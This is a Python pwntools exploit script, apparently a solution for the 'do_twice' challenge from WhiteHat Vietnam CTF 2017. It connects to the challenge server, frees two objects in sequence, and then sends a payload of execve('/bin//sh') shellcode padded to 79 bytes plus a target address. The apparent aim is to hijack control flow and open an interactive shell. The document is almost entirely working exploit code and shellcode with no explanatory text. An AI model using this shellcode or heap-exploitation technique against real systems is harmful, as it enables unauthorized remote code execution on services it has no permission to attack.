#!/usr/bin/python
from pwn import *

#WhiteHat Vietnam CTF 2017

#con = process( "./do_twice" )
con = remote("dotwice.wargame.whitehat.vn", 1337)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
info = 0x804b0c0

def create_passenger( name ):
	con.sendline( "1" )
	con.recvuntil( ":" )
	con.sendline( name )
	con.recvuntil( "4.Remove staff" )
def create_staff( name ):
	con.sendline( "3" )
	con.recvuntil( ":" )
	con.sendline( name )
def remove_passenger():
	con.sendline( "2" )
	con.recvuntil( "4.Remove staff" )

create_passenger( "AB" )
create_passenger( "CD" )
remove_passenger()
remove_passenger()

payload = shellcode.ljust(79, "A")
payload += p32(info)

create_staff( payload )

con.interactive()
